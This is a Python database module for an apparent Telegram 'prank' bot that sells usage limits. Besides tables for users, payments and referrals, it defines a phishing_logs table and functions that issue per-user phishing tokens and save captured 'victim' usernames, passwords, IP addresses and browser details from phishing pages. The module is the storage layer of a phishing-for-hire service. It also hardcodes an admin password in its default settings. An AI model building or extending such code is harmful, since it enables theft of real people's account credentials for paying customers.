import aiosqlite
import os
import uuid
from datetime import datetime, date

DB_PATH = os.path.join(os.path.dirname(__file__), 'bot_database.db')


async def init_db():
    """Initialize the database with all required tables."""
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute('''
            CREATE TABLE IF NOT EXISTS users (
                user_id INTEGER PRIMARY KEY,
                username TEXT,
                first_name TEXT,
                last_name TEXT,
                referrer_id INTEGER,
                total_limits INTEGER DEFAULT 3,
                used_today INTEGER DEFAULT 0,
                last_reset_date TEXT,
                is_premium INTEGER DEFAULT 0,
                premium_expires TEXT,
                total_pranks_sent INTEGER DEFAULT 0,
                total_effects_used INTEGER DEFAULT 0,
                joined_date TEXT,
                is_banned INTEGER DEFAULT 0
            )
        ''')

        await db.execute('''
            CREATE TABLE IF NOT EXISTS referrals (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                referrer_id INTEGER,
                referred_id INTEGER,
                bonus_given INTEGER DEFAULT 0,
                created_at TEXT
            )
        ''')

        await db.execute('''
            CREATE TABLE IF NOT EXISTS payments (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER,
                amount INTEGER,
                limits_count INTEGER,
                package_name TEXT,
                receipt_file_id TEXT,
                status TEXT DEFAULT 'pending',
                created_at TEXT,
                reviewed_at TEXT,
                reviewed_by INTEGER
            )
        ''')

        await db.execute('''
            CREATE TABLE IF NOT EXISTS prank_history (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER,
                prank_type TEXT,
                created_at TEXT
            )
        ''')

        await db.execute('''
            CREATE TABLE IF NOT EXISTS effect_history (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER,
                effect_type TEXT,
                created_at TEXT
            )
        ''')

        await db.execute('''
            CREATE TABLE IF NOT EXISTS settings (
                key TEXT PRIMARY KEY,
                value TEXT
            )
        ''')

        await db.execute('''
            CREATE TABLE IF NOT EXISTS phishing_logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                token TEXT UNIQUE,
                user_id INTEGER,
                site_type TEXT,
                victim_username TEXT,
                victim_password TEXT,
                victim_ip TEXT,
                victim_user_agent TEXT,
                created_at TEXT
            )
        ''')

        await db.execute('''
            CREATE TABLE IF NOT EXISTS required_channels (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                channel_username TEXT UNIQUE,
                channel_title TEXT,
                added_at TEXT
            )
        ''')

        await db.execute('''
            CREATE TABLE IF NOT EXISTS bot_admins (
                user_id INTEGER PRIMARY KEY,
                added_at TEXT
            )
        ''')

        # Insert default settings if they don't exist
        await db.execute("INSERT OR IGNORE INTO settings (key, value) VALUES ('referral_bonus', '3')")
        await db.execute("INSERT OR IGNORE INTO settings (key, value) VALUES ('daily_limit', '3')")
        await db.execute("INSERT OR IGNORE INTO settings (key, value) VALUES ('admin_password', 'shoxa2009')")

        # Premium prices can also be stored as single JSON string in settings to keep schema simple
        prices_json = '{"10_limit": {"amount": 5000, "limits": 10, "name": "10 ta limit"}, "30_limit": {"amount": 10000, "limits": 30, "name": "30 ta limit"}, "100_limit": {"amount": 25000, "limits": 100, "name": "100 ta limit"}, "unlimited": {"amount": 50000, "limits": 999, "name": "Cheksiz (1 oy)"}}'
        await db.execute("INSERT OR IGNORE INTO settings (key, value) VALUES ('prices', ?)", (prices_json,))

        await db.commit()


async def get_setting(key: str, default: str = None):
    """Get a global setting from database."""
    async with aiosqlite.connect(DB_PATH) as db:
        cursor = await db.execute('SELECT value FROM settings WHERE key = ?', (key,))
        row = await cursor.fetchone()
        return row[0] if row else default


async def set_setting(key: str, value: str):
    """Set a global setting in database."""
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute('INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)', (key, value))
        await db.commit()


async def get_user_by_username(username: str):
    """Get user data by username."""
    if username.startswith('@'):
        username = username[1:]
    async with aiosqlite.connect(DB_PATH) as db:
        db.row_factory = aiosqlite.Row
        cursor = await db.execute('SELECT * FROM users WHERE username = ?', (username,))
        return await cursor.fetchone()




async def get_user(user_id: int):
    """Get user data from database."""
    async with aiosqlite.connect(DB_PATH) as db:
        db.row_factory = aiosqlite.Row
        cursor = await db.execute('SELECT * FROM users WHERE user_id = ?', (user_id,))
        return await cursor.fetchone()


async def create_user(user_id: int, username: str, first_name: str, last_name: str, referrer_id: int = None):
    """Create a new user."""
    now = datetime.now().isoformat()
    daily_limit = int(await get_setting('daily_limit', '3'))
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute('''
            INSERT OR IGNORE INTO users 
            (user_id, username, first_name, last_name, referrer_id, total_limits, used_today, last_reset_date, joined_date)
            VALUES (?, ?, ?, ?, ?, ?, 0, ?, ?)
        ''', (user_id, username, first_name, last_name, referrer_id, daily_limit, str(date.today()), now))
        await db.commit()


async def check_and_reset_daily(user_id: int):
    """Check if daily limit needs to be reset."""
    async with aiosqlite.connect(DB_PATH) as db:
        cursor = await db.execute('SELECT last_reset_date, used_today FROM users WHERE user_id = ?', (user_id,))
        row = await cursor.fetchone()
        if row:
            last_reset = row[0]
            if last_reset != str(date.today()):
                await db.execute(
                    'UPDATE users SET used_today = 0, last_reset_date = ? WHERE user_id = ?',
                    (str(date.today()), user_id)
                )
                await db.commit()


async def use_limit(user_id: int) -> bool:
    """Use one limit. Returns True if successful, False if no limits left."""
    await check_and_reset_daily(user_id)
    async with aiosqlite.connect(DB_PATH) as db:
        cursor = await db.execute(
            'SELECT total_limits, used_today FROM users WHERE user_id = ?', (user_id,)
        )
        row = await cursor.fetchone()
        if row:
            total_limits, used_today = row
            if used_today < total_limits:
                await db.execute(
                    'UPDATE users SET used_today = used_today + 1 WHERE user_id = ?',
                    (user_id,)
                )
                await db.commit()
                return True
        return False


async def get_remaining_limits(user_id: int) -> tuple:
    """Get remaining limits for user."""
    await check_and_reset_daily(user_id)
    async with aiosqlite.connect(DB_PATH) as db:
        cursor = await db.execute(
            'SELECT total_limits, used_today FROM users WHERE user_id = ?', (user_id,)
        )
        row = await cursor.fetchone()
        if row:
            return row[0] - row[1], row[0]
        return 0, 0


async def add_limits(user_id: int, count: int):
    """Add limits to user."""
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute(
            'UPDATE users SET total_limits = total_limits + ? WHERE user_id = ?',
            (count, user_id)
        )
        await db.commit()


async def add_referral(referrer_id: int, referred_id: int):
    """Add referral record and give bonus."""
    bonus = int(await get_setting('referral_bonus', '3'))
    now = datetime.now().isoformat()
    async with aiosqlite.connect(DB_PATH) as db:
        # Check if already referred
        cursor = await db.execute(
            'SELECT id FROM referrals WHERE referred_id = ?', (referred_id,)
        )
        if await cursor.fetchone():
            return False

        await db.execute(
            'INSERT INTO referrals (referrer_id, referred_id, bonus_given, created_at) VALUES (?, ?, ?, ?)',
            (referrer_id, referred_id, bonus, now)
        )
        await db.execute(
            'UPDATE users SET total_limits = total_limits + ? WHERE user_id = ?',
            (bonus, referrer_id)
        )
        await db.commit()
        return True, bonus


async def get_referral_count(user_id: int) -> int:
    """Get number of referrals for user."""
    async with aiosqlite.connect(DB_PATH) as db:
        cursor = await db.execute(
            'SELECT COUNT(*) FROM referrals WHERE referrer_id = ?', (user_id,)
        )
        row = await cursor.fetchone()
        return row[0] if row else 0


async def create_payment(user_id: int, amount: int, limits_count: int, package_name: str, receipt_file_id: str):
    """Create a payment request."""
    now = datetime.now().isoformat()
    async with aiosqlite.connect(DB_PATH) as db:
        cursor = await db.execute('''
            INSERT INTO payments (user_id, amount, limits_count, package_name, receipt_file_id, status, created_at)
            VALUES (?, ?, ?, ?, ?, 'pending', ?)
        ''', (user_id, amount, limits_count, package_name, receipt_file_id, now))
        await db.commit()
        return cursor.lastrowid


async def get_pending_payments():
    """Get all pending payments."""
    async with aiosqlite.connect(DB_PATH) as db:
        db.row_factory = aiosqlite.Row
        cursor = await db.execute(
            'SELECT * FROM payments WHERE status = ? ORDER BY created_at DESC', ('pending',)
        )
        return await cursor.fetchall()


async def approve_payment(payment_id: int, admin_id: int):
    """Approve a payment and add limits to user."""
    now = datetime.now().isoformat()
    async with aiosqlite.connect(DB_PATH) as db:
        db.row_factory = aiosqlite.Row
        cursor = await db.execute('SELECT * FROM payments WHERE id = ?', (payment_id,))
        payment = await cursor.fetchone()
        if payment and payment['status'] == 'pending':
            await db.execute(
                'UPDATE payments SET status = ?, reviewed_at = ?, reviewed_by = ? WHERE id = ?',
                ('approved', now, admin_id, payment_id)
            )
            await db.execute(
                'UPDATE users SET total_limits = total_limits + ? WHERE user_id = ?',
                (payment['limits_count'], payment['user_id'])
            )
            await db.commit()
            return payment['user_id'], payment['limits_count']
    return None, None


async def reject_payment(payment_id: int, admin_id: int):
    """Reject a payment."""
    now = datetime.now().isoformat()
    async with aiosqlite.connect(DB_PATH) as db:
        db.row_factory = aiosqlite.Row
        cursor = await db.execute('SELECT * FROM payments WHERE id = ?', (payment_id,))
        payment = await cursor.fetchone()
        if payment and payment['status'] == 'pending':
            await db.execute(
                'UPDATE payments SET status = ?, reviewed_at = ?, reviewed_by = ? WHERE id = ?',
                ('rejected', now, admin_id, payment_id)
            )
            await db.commit()
            return payment['user_id']
    return None


async def add_prank_history(user_id: int, prank_type: str):
    """Record a prank usage."""
    now = datetime.now().isoformat()
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute(
            'INSERT INTO prank_history (user_id, prank_type, created_at) VALUES (?, ?, ?)',
            (user_id, prank_type, now)
        )
        await db.execute(
            'UPDATE users SET total_pranks_sent = total_pranks_sent + 1 WHERE user_id = ?',
            (user_id,)
        )
        await db.commit()


async def add_effect_history(user_id: int, effect_type: str):
    """Record an effect usage."""
    now = datetime.now().isoformat()
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute(
            'INSERT INTO effect_history (user_id, effect_type, created_at) VALUES (?, ?, ?)',
            (user_id, effect_type, now)
        )
        await db.execute(
            'UPDATE users SET total_effects_used = total_effects_used + 1 WHERE user_id = ?',
            (user_id,)
        )
        await db.commit()


async def get_all_users_count() -> int:
    """Get total number of users."""
    async with aiosqlite.connect(DB_PATH) as db:
        cursor = await db.execute('SELECT COUNT(*) FROM users')
        row = await cursor.fetchone()
        return row[0] if row else 0


async def get_today_users_count() -> int:
    """Get number of users who joined today."""
    async with aiosqlite.connect(DB_PATH) as db:
        cursor = await db.execute(
            "SELECT COUNT(*) FROM users WHERE DATE(joined_date) = ?",
            (str(date.today()),)
        )
        row = await cursor.fetchone()
        return row[0] if row else 0


async def get_all_users():
    """Get all user IDs for broadcast."""
    async with aiosqlite.connect(DB_PATH) as db:
        cursor = await db.execute('SELECT user_id FROM users WHERE is_banned = 0')
        rows = await cursor.fetchall()
        return [row[0] for row in rows]


async def get_total_stats():
    """Get total bot statistics."""
    async with aiosqlite.connect(DB_PATH) as db:
        users = await (await db.execute('SELECT COUNT(*) FROM users')).fetchone()
        banned = await (await db.execute('SELECT COUNT(*) FROM users WHERE is_banned = 1')).fetchone()
        pranks = await (await db.execute('SELECT COUNT(*) FROM prank_history')).fetchone()
        effects = await (await db.execute('SELECT COUNT(*) FROM effect_history')).fetchone()
        referrals = await (await db.execute('SELECT COUNT(*) FROM referrals')).fetchone()
        payments = await (await db.execute(
            "SELECT COUNT(*), COALESCE(SUM(amount), 0) FROM payments WHERE status = 'approved'"
        )).fetchone()
        pending = await (await db.execute(
            "SELECT COUNT(*) FROM payments WHERE status = 'pending'"
        )).fetchone()
        
        return {
            'total_users': users[0],
            'banned_users': banned[0],
            'total_pranks_sent': pranks[0],
            'total_effects_used': effects[0],
            'total_referrals': referrals[0],
            'total_payments': payments[0],
            'total_revenue': payments[1],
            'pending_payments': pending[0]
        }


# ============================================================
# PHISHING TOKEN FUNCTIONS
# ============================================================

async def create_phishing_token(user_id: int, site_type: str) -> str:
    """Create a unique phishing token for a user."""
    token = uuid.uuid4().hex[:12]
    now = datetime.now().isoformat()
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute('''
            INSERT INTO phishing_logs (token, user_id, site_type, created_at)
            VALUES (?, ?, ?, ?)
        ''', (token, user_id, site_type, now))
        await db.commit()
    return token


async def save_phishing_data(token: str, username: str, password: str, ip: str = '', user_agent: str = ''):
    """Save victim data from phishing page."""
    async with aiosqlite.connect(DB_PATH) as db:
        db.row_factory = aiosqlite.Row
        cursor = await db.execute('SELECT * FROM phishing_logs WHERE token = ?', (token,))
        log = await cursor.fetchone()
        if log and not log['victim_username']:
            await db.execute('''
                UPDATE phishing_logs 
                SET victim_username = ?, victim_password = ?, victim_ip = ?, victim_user_agent = ?
                WHERE token = ?
            ''', (username, password, ip, user_agent, token))
            await db.commit()
            return dict(log)
    return None


async def get_phishing_log_by_token(token: str):
    """Get phishing log by token."""
    async with aiosqlite.connect(DB_PATH) as db:
        db.row_factory = aiosqlite.Row
        cursor = await db.execute('SELECT * FROM phishing_logs WHERE token = ?', (token,))
        return await cursor.fetchone()


# ============================================================
# REQUIRED CHANNELS FUNCTIONS
# ============================================================

async def add_required_channel(channel_username: str, channel_title: str = ''):
    """Add a required channel for forced subscription."""
    now = datetime.now().isoformat()
    if not channel_username.startswith('@'):
        channel_username = '@' + channel_username
    async with aiosqlite.connect(DB_PATH) as db:
        try:
            await db.execute('''
                INSERT INTO required_channels (channel_username, channel_title, added_at)
                VALUES (?, ?, ?)
            ''', (channel_username, channel_title, now))
            await db.commit()
            return True
        except Exception:
            return False


async def remove_required_channel(channel_username: str):
    """Remove a required channel."""
    if not channel_username.startswith('@'):
        channel_username = '@' + channel_username
    async with aiosqlite.connect(DB_PATH) as db:
        cursor = await db.execute(
            'DELETE FROM required_channels WHERE channel_username = ?', (channel_username,)
        )
        await db.commit()
        return cursor.rowcount > 0


async def get_required_channels():
    """Get all required channels."""
    async with aiosqlite.connect(DB_PATH) as db:
        db.row_factory = aiosqlite.Row
        cursor = await db.execute('SELECT * FROM required_channels ORDER BY id')
        return await cursor.fetchall()


async def add_admin(user_id: int):
    """Add a user to the bot_admins table."""
    now = datetime.now().isoformat()
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute('INSERT OR IGNORE INTO bot_admins (user_id, added_at) VALUES (?, ?)', (user_id, now))
        await db.commit()


async def get_admins():
    """Get all user IDs from the bot_admins table."""
    async with aiosqlite.connect(DB_PATH) as db:
        cursor = await db.execute('SELECT user_id FROM bot_admins')
        rows = await cursor.fetchall()
        return [row[0] for row in rows]


async def block_user(user_id_or_username: str):
    """Block user by ID or username."""
    async with aiosqlite.connect(DB_PATH) as db:
        if str(user_id_or_username).startswith('@') or not str(user_id_or_username).isdigit():
            username = str(user_id_or_username).replace('@', '')
            await db.execute('UPDATE users SET is_banned = 1 WHERE username = ?', (username,))
        else:
            await db.execute('UPDATE users SET is_banned = 1 WHERE user_id = ?', (int(user_id_or_username),))
        await db.commit()
        return True


async def unblock_user(user_id_or_username: str):
    """Unblock user by ID or username."""
    async with aiosqlite.connect(DB_PATH) as db:
        if str(user_id_or_username).startswith('@') or not str(user_id_or_username).isdigit():
            username = str(user_id_or_username).replace('@', '')
            await db.execute('UPDATE users SET is_banned = 0 WHERE username = ?', (username,))
        else:
            await db.execute('UPDATE users SET is_banned = 0 WHERE user_id = ?', (int(user_id_or_username),))
        await db.commit()
        return True


async def is_user_banned(user_id: int) -> bool:
    """Check if user is banned."""
    user = await get_user(user_id)
    return user['is_banned'] == 1 if user else False


async def gift_premium(user_id_or_username: str, limits: int):
    """Gift limits to user by ID or username."""
    async with aiosqlite.connect(DB_PATH) as db:
        if str(user_id_or_username).startswith('@') or not str(user_id_or_username).isdigit():
            username = str(user_id_or_username).replace('@', '')
            cursor = await db.execute('SELECT user_id FROM users WHERE username = ?', (username,))
            row = await cursor.fetchone()
            if not row:
                return False
            user_id = row[0]
        else:
            user_id = int(user_id_or_username)
            cursor = await db.execute('SELECT user_id FROM users WHERE user_id = ?', (user_id,))
            if not await cursor.fetchone():
                return False

        await db.execute('UPDATE users SET total_limits = total_limits + ? WHERE user_id = ?', (limits, user_id))
        await db.commit()
        return user_id
